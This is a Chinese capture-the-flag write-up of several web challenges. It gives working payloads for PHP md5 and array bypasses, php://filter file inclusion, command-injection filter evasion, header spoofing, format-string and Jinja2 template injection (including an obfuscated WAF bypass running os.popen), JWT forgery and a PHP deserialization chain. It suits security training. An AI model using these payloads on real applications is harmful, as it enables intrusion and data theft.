---
author: Ghost1032
date: 2021-09-21
group: ¿¿¿
---
# Writeup

## 写在前面
几乎零基础 靠伟大的搜索工具A了Web部分 Misc杂七杂八做了一点</br>
所以WP中加上了自己做题时搜索的关键字</br>
<font size="2">我愿称自己为 Google工程&emsp;师(</font>
## Web

### GET
```Payload:http://url/?moe=flag```
### POST

```
Payload:使用hackbar/burpsuite/requests库
moe=flag
```
### 2048
```
解法一:打到50000分(???
解法二:用burpsuite抓包 将score修改至大于50000
```
### Web_In

要求a!=b且 md5(a)===md5(b)</br>
即a和b类型相同 MD5值相同但值不同</br>
在baidu中搜索 php md5漏洞</br>
可以知道:
<blockquote>
PHP在处理哈希字符串时，它把每一个以“0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以“0E”开头的，那么PHP将会认为他们相同，都是0.</br>
以下值在md5加密后以0E开头：</br>
QNKCDZO</br>
240610708</br>
s878926199a</br>
s155964671a</br>
s214587387a</br>
s214587387a</br>
然而</br>
在php中===为完全等于运算，不仅比较值，而且还比较值的类型，只有两者一致才为真。再次使用a=QNKCDZO&b=240610708就不行了，因为a和b类型不同。</br>
在php中 md5([1,2,3]) == md5([4,5,6]) == NULL
</br>
</blockquote>
<a href = "https://blog.csdn.net/qq_19980431/article/details/83018232">[参考博客]<a/>

```
得出Payload: GET传入a[]=1 POST传入b[]=2
```
### ezinlcude
```
<?php
error_reporting(0);
if(isset($_GET['file'])){
    $file = $_GET['file'];
    include($file);
}else{
    highlight_file(__FILE__);
} 
```

根据题面和include有关</br>
搜索php inlcude漏洞</br>
可以知道:</br>
<blockquote>
php://filter用于读取源码</br>
php://input用于执行php代码</br>
使用 "php://filter"伪协议" 来进行包含。当它与包含函数结合时，php://filter流会被当作php文件执行。所以我们一般对其进行编码，阻止其不执行。从而导致任意文件读取。
</blockquote>
<a href = "https://blog.csdn.net/qq_19980431/article/details/83018232https://www.cnblogs.com/cmredkulaa/p/14008645.html">[参考博客]<a/>

```
Payload:?file=php://filter/read=convert.base64-encode/
resource=flag.php
```
输出内容后再用base64解密得到flag
### babeRCE
```
<?php

$rce = $_GET['rce'];
if (isset($rce)) {
    if (!preg_match("/cat|more|less|head|tac|tail|nl|od|vi|vim|sort|flag| |\;|[0-9]|\*|\`|\%|\>|\<|\'|\"/i", $rce)) {
        system($rce);
    }else {
        echo "hhhhhhacker!!!"."\n";
    }
} else {
    highlight_file(__FILE__);
}
```
根据题面 搜索ctf rce</br>
大部分关键字都过滤了</br>
仔细对比后发现还有grep可以用
结合通配符,空格绕过</br>
<a href = "https://blog.csdn.net/qq_19980431/article/details/83018232https://www.cnblogs.com/cmredkulaa/p/14008645.htmlhttps://blog.csdn.net/qq_44657899/article/details/107676580">[参考博客]<a/>
```
Payload:?rce=grep${IFS}f${IFS}fla?.php
```
### Do you know HTTP?
此题考察HTTP请求中的header

用'HS'来请求试试？
```
将请求方法改为HS
```
只有本地ip地址才可以哦！
```
X-Forwarded-For: 127.0.0.1
```
我希望你是从'www.ltyyds.com'过来的！
```
Referer: www.ltyyds.com
```
'LT'才是本题官方浏览器哦！
```
User-Agent: LT
```
```
HS / HTTP/1.1
Host: 47.93.215.154:5002
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: LT
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
X-Forwarded-For: 127.0.0.1
Referer: www.ltyyds.com
```
### 地狱通信-改
```
from flask import Flask, render_template, request, session, redirect, make_response
from secret import secret, headers, User
import datetime
import jwt

app = Flask(__name__)


@app.route("/", methods=['GET', 'POST'])
def index():
    f = open("app.py", "r")
    ctx = f.read()
    f.close()
    res = make_response(ctx)
    name = request.args.get('name') or ''
    if 'admin' in name or name == '':
        return res
    payload = {
        "name": name,
    }
    token = jwt.encode(payload, secret, algorithm='HS256', headers=headers)
    res.set_cookie('token', token)
    return res


@app.route('/hello', methods=['GET', 'POST'])
def hello():
    token = request.cookies.get('token')
    if not token:
        return redirect('/', 302)
    try:
        name = jwt.decode(token, secret, algorithms=['HS256'])['name']
    except jwt.exceptions.InvalidSignatureError as e:
        return "Invalid token"
    if name != "admin":
        user = User(name)
        flag = request.args.get('flag') or ''
        message = "Hello {0}, your flag is" + flag
        return message.format(user)
    else:
        return render_template('flag.html', name=name)


if __name__ == "__main__":
    app.run()
```
分析代码,登录流程为输入name->构造token->保存至cookie->解析token-></br>
如果name为admin输出flag</br>
而登录时如果直接传入admin会直接回显 所以得想办法伪造token</br>
token采用jwt,而构造jwt需要密钥</br>
注意到```message = "Hello {0}, your flag is" + flag```
于是考虑SSTI</br>
<a href = "https://www.cnblogs.com/hackxf/p/10480071.html">[参考博客]<a/></br>
```
Payload:先访问/?name=test设置name
再访问/hello?flag={0.__class__.__init__.__globals__}
得到密钥 u_have_kn0w_what_f0rmat_i5
访问jwt.io构造token 填入密钥,将name改为admin得到token
最后修改cookie中的token 访问/hello得到flag
```

### 地狱通讯???
思路同上 SSTI直接得出flag

### eeeeeeeeeeezunserialize
```
<?php

class entrance
{
    public $start;

    function __construct($start)
    {
        $this->start = $start;
    }

    function __destruct()
    {
        $this->start->helloworld();
    }
}

class springboard
{
    public $middle;

    function __call($name, $arguments)
    {
        echo $this->middle->hs;
    }
}

class evil
{
    public $end;

    function __construct($end)
    {
        $this->end = $end;
    }

    function __get($Attribute)
    {
        eval($this->end);
    }
}

if(isset($_GET['serialize'])) {
    unserialize($_GET['serialize']);
} else {
    highlight_file(__FILE__);
}
```
根据题面 直接搜索php反序列化
<a href="https://www.cnblogs.com/williamzou1999/p/14683192.html">[参考博客]</a></br>
分析代码 在evil类下的```__get```方法中调用了eval函数 以此为突破口</br>
魔术方法```__get```会在读取不可访问属性的值时调用</br>
而在```springboard```类下```__call```中访问了```$this->middle->hs```</br>
于是想办法调用```__call```
```__call```会在在对象中调用一个不可访问方法时调用</br>
注意到```entrance```类下```__destruct```调用了```$this->start->helloworld()```</br>
而```__desturct```会在对象被销毁时执行 即代码执行完毕</br>
因而依葫芦画瓢得到下面代码 修改evil()中的值执行任意指令

```
<?php
class entrance
{
    public $start;
    public function __construct()
    {
        $this->start = new springboard();
    }
}

class springboard
{
    public $middle;

    public function __construct(){
        $this->middle = new evil("system('cat /flag');");
    }
}

class evil
{
    public $end;

    function __construct($end)
    {
        $this->end = $end;
    }

    function __get($Attribute)
    {
        eval($this->end);
    }
}
$payload = new entrance();
$a = serialize($payload);
echo $a;
?>
```
最后的Payload:```?serialize=O:8:"entrance":1:{s:5:"start";O:11:"springboard":1:{s:6:"middle";O:4:"evil":1:{s:3:"end";s:20:"system(%27cat%20/flag%27);";}}}```

### 让 我 访 问
先看题面 题目应用了python框架,大概率会遇到waf过滤</br>
访问网页后是一个登录界面 直接怒戳F12</br>
发现一个/action接口 参数goto=register
访问后提示```Sorry, register page is lost.```</br>
修改goto为其他值 发现返回值相应改变</br>
结合地狱通讯所学以及题目提示python 很可能又是SSTI</br>
输入goto={{7*7}}返回49 确实存在SSTI</br>
直接照搬地狱通讯 发现返回状态码500 payload被waf拦截
<blockquote>这个时候应该fuzz一波看看过滤了哪些关键字 再考虑绕过</br>
然而阴差阳错间我在github上搜到本葵花宝典
</blockquote>
<a href="https://github.com/swisskyrepo/PayloadsAllTheThings">PayloadsAllTheThings</a></br>
<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/b3d31e45e58d806680d4977fe6e7cfbd42f1b5eb/Server%20Side%20Template%20Injection/README.md#jinja2---filter-bypass">SSTI payload</a></br>
采用绕过最多常用waf的payload:

```
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('cat /flag')|attr('read')()}}
```
得到flag

### fake game
<blockquote>第一次莫名其妙拿到flag 事后得知是题目问题</blockquote>
<blockquote>后来有高人@CyXq指点 才知道和原型链污染有关</blockquote>
<a href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html">[参考博客]</a>

## Pwn

## Re

## Misc

## Crypto

>...
